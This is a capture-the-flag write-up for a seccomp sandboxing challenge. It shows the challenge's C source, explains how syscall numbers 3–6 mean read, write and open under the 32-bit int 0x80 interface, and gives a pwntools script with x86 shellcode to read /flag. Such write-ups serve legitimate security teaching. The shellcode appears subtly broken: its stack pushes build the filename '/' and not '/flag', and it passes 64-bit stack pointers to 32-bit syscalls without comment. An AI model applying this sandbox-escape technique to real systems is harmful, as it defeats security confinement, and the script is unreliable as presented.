#metadata(
  (
    title: "Cross-Arch Syscall Confusion",
    description: "Writeup for Sandboxing Level 9",
    date: "2026-01-01",
    order: 9,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Cross-Arch Syscall Confusion

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_ALLOW);
    for (int i = 0; i < 512; i++)
    {
        switch (i)
        {
        case SCMP_SYS(close):
            continue;
        case SCMP_SYS(stat):
            continue;
        case SCMP_SYS(fstat):
            continue;
        case SCMP_SYS(lstat):
            continue;
        }
        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
    }

    seccomp_arch_add(ctx, SCMP_ARCH_X86);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

The challenge implements a seccomp filter that whitelists specific system calls (`close`, `stat`, `fstat`, `lstat`) and explicitly enables support for the 32-bit x86 architecture (`SCMP_ARCH_X86`).

The vulnerability arises because seccomp filters often check the system call *number*, but system call numbers differ between architectures.

*   **x86-64 (64-bit):**
    *   `close`: 3
    *   `stat`: 4
    *   `fstat`: 5
    *   `lstat`: 6
*   **x86 (32-bit):**
    *   `read`: 3
    *   `write`: 4
    *   `open`: 5

The filter allows syscalls 3, 4, 5, and 6. If we switch the processor to 32-bit mode (or simply execute the 32-bit `int 0x80` instruction), the kernel interprets these numbers as `read`, `write`, and `open`.

== Exploitation Plan

1.  **Switch Mode (Conceptually):** We don't need to fully switch the process to 32-bit mode; we just need to use the 32-bit system call interface (`int 0x80`).
2.  **Open Flag:** Call syscall 5 (`open`) to open `/flag`.
3.  **Read Flag:** Call syscall 3 (`read`) to read from the FD returned by open.
4.  **Write Flag:** Call syscall 4 (`write`) to write the flag to stdout.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

p = process(exe)

# We use 32-bit shellcode (x86) to trigger the confused syscalls.
# Even though the process is 64-bit, we can execute 32-bit syscalls using int 0x80.
shellcode = asm("""
    .code32
    
    /* open("/flag", 0) -> syscall 5 */
    push 0                  /* null terminator */
    push 0x67616c66         /* "flag" */
    push 0x2f               /* "/" */
    mov ebx, esp            /* filename pointer */
    xor ecx, ecx            /* flags: O_RDONLY */
    mov eax, 5              /* syscall: open (32-bit) */
    int 0x80

    /* read(fd, buf, 100) -> syscall 3 */
    mov ebx, eax            /* fd from open */
    mov ecx, esp            /* buffer (reuse stack) */
    mov edx, 100            /* count */
    mov eax, 3              /* syscall: read (32-bit) */
    int 0x80

    /* write(1, buf, 100) -> syscall 4 */
    mov ebx, 1              /* fd: stdout */
    mov ecx, esp            /* buffer */
    mov edx, eax            /* count (bytes read) */
    mov eax, 4              /* syscall: write (32-bit) */
    int 0x80

    /* exit(0) */
    mov eax, 1
    xor ebx, ebx
    int 0x80
""", arch="i386")

p.send(shellcode)
p.interactive()
```
